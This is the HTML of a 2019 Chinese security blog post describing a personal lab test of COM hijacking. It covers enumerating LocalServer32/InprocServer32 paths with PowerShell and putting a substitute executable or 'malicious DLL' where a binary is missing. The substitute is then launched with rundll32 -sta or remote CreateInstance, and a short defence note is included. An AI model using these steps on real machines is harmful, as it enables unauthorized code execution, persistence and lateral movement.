@@ -1,0 +1,285 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head><meta name="generator" content="Hexo 3.8.0">
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="description" content="前言昨天看了一篇：滥用COM注册表结构：CLSID，LocalServer32和InprocServer32进行横向渗透的文章，感觉还不错。决定搞懂这波操作 正文供应商包括和/或留下可能被攻击者滥用以进行横向移动，规避，绕过和持久性的注册表，可以导致攻击者进行利用和横向移动12使用rundll32.exe -sta &amp;#123;CLSID&amp;#125; 可以调用CLSID，rundll只能用于运行d">
+<meta name="keywords" content="Writing">
+<meta property="og:type" content="article">
+<meta property="og:title" content="滥用COM注册表结构：CLSID，LocalServer32和InprocServer32学习">
+<meta property="og:url" content="http://422926799.github.io/posts/d9256889.html">
+<meta property="og:site_name" content="九世的博客">
+<meta property="og:description" content="前言昨天看了一篇：滥用COM注册表结构：CLSID，LocalServer32和InprocServer32进行横向渗透的文章，感觉还不错。决定搞懂这波操作 正文供应商包括和/或留下可能被攻击者滥用以进行横向移动，规避，绕过和持久性的注册表，可以导致攻击者进行利用和横向移动12使用rundll32.exe -sta &amp;#123;CLSID&amp;#125; 可以调用CLSID，rundll只能用于运行d">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://f.hiphotos.baidu.com/zhidao/wh%3D680%2C800/sign=6ffc878db8de9c82a630f18954b1ac32/b7003af33a87e950c88e90d81b385343faf2b4ed.jpg">
+<meta property="og:image" content="https://s2.ax1x.com/2019/07/07/Z0jLtg.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/07/07/Z0vIC4.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/07/07/Z0vzPe.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/07/07/Z0xFqP.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/07/07/Z0xmGQ.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/07/07/Z0xQrq.md.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/07/07/Z0xYiF.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/07/07/Z0xNRJ.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/07/07/Z0xDZ6.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/07/07/Z0xsIO.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/07/07/Z0xcJe.png">
+<meta property="og:updated_time" content="2019-07-07T01:31:26.495Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="滥用COM注册表结构：CLSID，LocalServer32和InprocServer32学习">
+<meta name="twitter:description" content="前言昨天看了一篇：滥用COM注册表结构：CLSID，LocalServer32和InprocServer32进行横向渗透的文章，感觉还不错。决定搞懂这波操作 正文供应商包括和/或留下可能被攻击者滥用以进行横向移动，规避，绕过和持久性的注册表，可以导致攻击者进行利用和横向移动12使用rundll32.exe -sta &amp;#123;CLSID&amp;#125; 可以调用CLSID，rundll只能用于运行d">
+<meta name="twitter:image" content="http://f.hiphotos.baidu.com/zhidao/wh%3D680%2C800/sign=6ffc878db8de9c82a630f18954b1ac32/b7003af33a87e950c88e90d81b385343faf2b4ed.jpg">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>滥用COM注册表结构：CLSID，LocalServer32和InprocServer32学习</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+      <link rel="stylesheet" href="/css/rtl.css">
+    
+    <!-- rss -->
+    
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/archives">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+         
+          <li><a href="/Search">搜索</a></li>
+         
+          <li><a href="/Href">友链</a></li>
+        
+      </ul>
+    </span>
+    <br>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="/posts/7dc498ec.html"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://422926799.github.io/posts/d9256889.html"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://422926799.github.io/posts/d9256889.html&text=滥用COM注册表结构：CLSID，LocalServer32和InprocServer32学习"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://422926799.github.io/posts/d9256889.html&title=滥用COM注册表结构：CLSID，LocalServer32和InprocServer32学习"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://422926799.github.io/posts/d9256889.html&is_video=false&description=滥用COM注册表结构：CLSID，LocalServer32和InprocServer32学习"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=滥用COM注册表结构：CLSID，LocalServer32和InprocServer32学习&body=Check out this article: http://422926799.github.io/posts/d9256889.html"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://422926799.github.io/posts/d9256889.html&title=滥用COM注册表结构：CLSID，LocalServer32和InprocServer32学习"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://422926799.github.io/posts/d9256889.html&title=滥用COM注册表结构：CLSID，LocalServer32和InprocServer32学习"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://422926799.github.io/posts/d9256889.html&title=滥用COM注册表结构：CLSID，LocalServer32和InprocServer32学习"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://422926799.github.io/posts/d9256889.html&title=滥用COM注册表结构：CLSID，LocalServer32和InprocServer32学习"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://422926799.github.io/posts/d9256889.html&name=滥用COM注册表结构：CLSID，LocalServer32和InprocServer32学习&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#正文"><span class="toc-number">2.</span> <span class="toc-text">正文</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope="" itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        滥用COM注册表结构：CLSID，LocalServer32和InprocServer32学习
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+        <span itemprop="name">九世的博客</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2019-07-07T00:31:09.000Z" itemprop="datePublished">2019-07-07</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/Writing/">Writing</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>昨天看了一篇：滥用COM注册表结构：CLSID，LocalServer32和InprocServer32进行横向渗透的文章，感觉还不错。决定搞懂这波操作<br><img src="http://f.hiphotos.baidu.com/zhidao/wh%3D680%2C800/sign=6ffc878db8de9c82a630f18954b1ac32/b7003af33a87e950c88e90d81b385343faf2b4ed.jpg" alt=""></p>
+<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>供应商包括和/或留下可能被攻击者滥用以进行横向移动，规避，绕过和持久性的注册表，可以导致攻击者进行利用和横向移动<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">使用rundll32.exe -sta &#123;CLSID&#125; 可以调用CLSID，rundll只能用于运行dll</span><br><span class="line">:rundll32.exe -sta &#123;CLSID&#125;只能在powershell2.0版本或2.0版本上执行</span><br></pre></td></tr></table></figure></p>
+<p>rundll32不是2.0版本或以上将出现以下错误<br><img src="https://s2.ax1x.com/2019/07/07/Z0jLtg.png" alt=""></p>
+<p>防御手段：卸载程序后，清除注册表里的项值，监视可疑事件（例如：rundll32.exe的使用情况），并实施强大的应用程序白名单（AWL）策略/规则</p>
+<p>枚举所有LocalServer32键值<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$inproc</span> = gwmi Win32_COMSetting | ?&#123; <span class="variable">$_</span>.LocalServer32 <span class="nomarkup">-ne</span> <span class="literal">$null</span> &#125;</span><br><span class="line"><span class="variable">$inproc</span> | <span class="keyword">ForEach</span> &#123;<span class="variable">$_</span>.LocalServer32&#125; &gt; values.txt</span><br><span class="line">```</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://s2.ax1x.com/2019/07/07/Z0vIC4.png" alt=""></p>
+<p> 枚举所有所有InprocServer32的键值<br> <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> <span class="variable">$inproc</span> = gwmi Win32_COMSetting | ?&#123; <span class="variable">$_</span>.InprocServer32 <span class="nomarkup">-ne</span> <span class="literal">$null</span> &#125;</span><br><span class="line"><span class="variable">$paths</span> = <span class="variable">$inproc</span> | <span class="keyword">ForEach</span> &#123;<span class="variable">$_</span>.InprocServer32&#125; &gt; demo.txt</span><br></pre></td></tr></table></figure></p>
+<p> 根据上面找到的路径，去寻找是否这个二进制文件。如果缺失的话就可以执行利用 关键字：File Not Found</p>
+<p> 自己做的一个小测试：<br>PS：由于没有真实环境，根据上面的ps1代码收集了所有LocalServer32的二进制路径<br>我拿FlashUtil_ActiveX.exe做实验<br><img src="https://s2.ax1x.com/2019/07/07/Z0vzPe.png" alt="Z0vzPe.png"></p>
+<p>由于一开始，这个二进制文件权限是TrustedInstaller所有者，你先将其改为Everyone Allow<br>现在假设缺少这个FlashUtil_ActiveX.exe<br>首先一开始使用get-acl “文件路径” | fl 查看这个二进制文件的路径权限<br><img src="https://s2.ax1x.com/2019/07/07/Z0xFqP.png" alt="Z0xFqP.png"></p>
+<p>由于上面我们进行收集了注册表所有CLSID，现在去HKCU\CLSID里面搜索FlashUtil_ActiveX.exe，后面得到CLSID<br><img src="https://s2.ax1x.com/2019/07/07/Z0xmGQ.png" alt="Z0xmGQ.png"></p>
+<p>我们将calc.exe改名为FlashUtil_ActiveX.exe，然后copy到那个文件路径。<br>然后执行<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[activator]::CreateInstance([type]::GetTypeFromCLSID(<span class="string">"CLSID"</span>,<span class="string">"IP地址"</span>))</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://s2.ax1x.com/2019/07/07/Z0xQrq.md.png" alt=""></p>
+<p>即可弹出calc</p>
+<p>如果出下如下图指标画出来的错误，先删除原来copy进行的exe。然后在copy一次在执行即可<br><img src="https://s2.ax1x.com/2019/07/07/Z0xYiF.png" alt="Z0xYiF.png"></p>
+<p>通过上面的ps1代码寻找了localServer32和InprocServer32后，如果有关键File not found的话代表那个CLSID缺少二进制文件或dll</p>
+<p>注意，powershell版本不同，不能远程操作COM （windows7版本，powershell 1.0，无法控制windows 10 powershell版本5.0）</p>
+<p><img src="https://s2.ax1x.com/2019/07/07/Z0xNRJ.png" alt="Z0xNRJ.png"></p>
+<p>滥用注册表COM CSLID与Rundll32<br>根据文章中的说明，执行上面所说的ps1代码，然后寻找缺少的dll的路径，使用get-acl “文件路径” | fl 查看路径的权限<br><img src="https://s2.ax1x.com/2019/07/07/Z0xDZ6.png" alt="Z0xDZ6.png"></p>
+<p>像上图这种，Everyone为文件所有者的话。可以copy一个恶意dll来代替缺少的dll，然后使用rundll32 -sta {CLSID}执行即可<br><img src="https://s2.ax1x.com/2019/07/07/Z0xsIO.png" alt="Z0xsIO.png"></p>
+<p>让我们使用以下命令加载我们的DLL有效载荷与相应的CLSID：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32.exe -sta &#123;3d09c1ca-2bcc-40b7-b9bb-3f3ec143a87b&#125;</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://s2.ax1x.com/2019/07/07/Z0xcJe.png" alt="Z0xcJe.png"></p>
+<p>注意：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HKCU中的CLSID值优先于HKLM中的CLSID值</span><br><span class="line">rundll32 -sta&#123;CLSID&#125; 只能是CLSID里的InprocServer32里面的dll调用</span><br><span class="line">或者直接使用rundll32调用dll</span><br></pre></td></tr></table></figure></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/archives">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+         
+          <li><a href="/Search">搜索</a></li>
+         
+          <li><a href="/Href">友链</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#正文"><span class="toc-number">2.</span> <span class="toc-text">正文</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://422926799.github.io/posts/d9256889.html"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://422926799.github.io/posts/d9256889.html&text=滥用COM注册表结构：CLSID，LocalServer32和InprocServer32学习"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://422926799.github.io/posts/d9256889.html&title=滥用COM注册表结构：CLSID，LocalServer32和InprocServer32学习"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://422926799.github.io/posts/d9256889.html&is_video=false&description=滥用COM注册表结构：CLSID，LocalServer32和InprocServer32学习"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=滥用COM注册表结构：CLSID，LocalServer32和InprocServer32学习&body=Check out this article: http://422926799.github.io/posts/d9256889.html"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://422926799.github.io/posts/d9256889.html&title=滥用COM注册表结构：CLSID，LocalServer32和InprocServer32学习"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://422926799.github.io/posts/d9256889.html&title=滥用COM注册表结构：CLSID，LocalServer32和InprocServer32学习"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://422926799.github.io/posts/d9256889.html&title=滥用COM注册表结构：CLSID，LocalServer32和InprocServer32学习"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://422926799.github.io/posts/d9256889.html&title=滥用COM注册表结构：CLSID，LocalServer32和InprocServer32学习"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://422926799.github.io/posts/d9256889.html&name=滥用COM注册表结构：CLSID，LocalServer32和InprocServer32学习&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2019 九世
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/archives">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+         
+          <li><a href="/Search">搜索</a></li>
+         
+          <li><a href="/Href">友链</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+    <!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
